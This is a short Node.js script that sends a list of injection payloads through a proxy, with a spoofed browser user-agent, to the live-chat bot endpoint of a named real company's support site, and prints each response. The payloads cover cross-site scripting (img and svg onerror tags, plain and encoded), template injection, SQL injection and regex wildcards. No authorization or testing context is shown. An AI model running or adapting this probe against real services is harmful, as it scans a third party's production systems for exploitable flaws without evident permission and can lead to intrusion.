const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const inputs=[
 'end<img src=x onerror=alert(1)>',
 'end"><svg onload=alert(1)>',
 'end</span><img src=x onerror=alert(1)>',
 'end<svg/onload=alert(1)>',
 'end.*',
 'end|.*',
 'end${7*7}',
 'end%00',
 '<img src=x onerror=alert(1)> end',
 "end' OR 1=1--",
 'end{{7*7}}',
 'end\\u003cimg src=x onerror=alert(1)\\u003e',
 'end%3Cimg%20src=x%20onerror=alert(1)%3E',
 'order<img src=x onerror=alert(1)>',
 'the<img src=x onerror=alert(1)>',
 'is<img src=x onerror=alert(1)>',
];
(async()=>{
 for(const c of inputs){
  try{const r=await fetch(B+'/gw/robot/front/fuzzy',{method:'POST',headers:{'content-type':'application/json',origin:B,referer:B+'/liveChat','user-agent':UA,'x-robot-user':'probe','x-bbl-official-site-region':'EN'},body:JSON.stringify({content:c}),dispatcher:d,signal:AbortSignal.timeout(20000)});const t=await r.text();console.log('\nIN',JSON.stringify(c),'STATUS',r.status);console.log(t.slice(0,700));}catch(e){console.log('ERR',JSON.stringify(c),e.message)}
 }
})();
